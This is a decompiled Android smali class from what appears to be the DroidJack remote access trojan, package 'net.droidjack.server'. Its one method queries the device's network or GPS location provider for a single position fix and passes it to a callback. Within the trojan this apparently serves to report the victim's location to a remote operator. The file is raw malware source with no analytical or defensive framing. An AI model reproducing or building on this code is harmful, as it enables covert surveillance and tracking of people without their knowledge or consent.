.class Lnet/droidjack/server/bh;
.super Ljava/lang/Object;


# direct methods
.method public static a(Landroid/content/Context;Lnet/droidjack/server/bl;)V
    .locals 4

    const/4 v3, 0x0

    const-string v0, "location"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Landroid/location/Criteria;

    invoke-direct {v1}, Landroid/location/Criteria;-><init>()V

    const/4 v2, 0x2

    invoke-virtual {v1, v2}, Landroid/location/Criteria;->setAccuracy(I)V

    new-instance v2, Lnet/droidjack/server/bi;

    invoke-direct {v2, p1}, Lnet/droidjack/server/bi;-><init>(Lnet/droidjack/server/bl;)V

    invoke-virtual {v0, v1, v2, v3}, Landroid/location/LocationManager;->requestSingleUpdate(Landroid/location/Criteria;Landroid/location/LocationListener;Landroid/os/Looper;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Landroid/location/Criteria;

    invoke-direct {v1}, Landroid/location/Criteria;-><init>()V

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/location/Criteria;->setAccuracy(I)V

    new-instance v2, Lnet/droidjack/server/bj;

    invoke-direct {v2, p1}, Lnet/droidjack/server/bj;-><init>(Lnet/droidjack/server/bl;)V

    invoke-virtual {v0, v1, v2, v3}, Landroid/location/LocationManager;->requestSingleUpdate(Landroid/location/Criteria;Landroid/location/LocationListener;Landroid/os/Looper;)V

    goto :goto_0
.end method
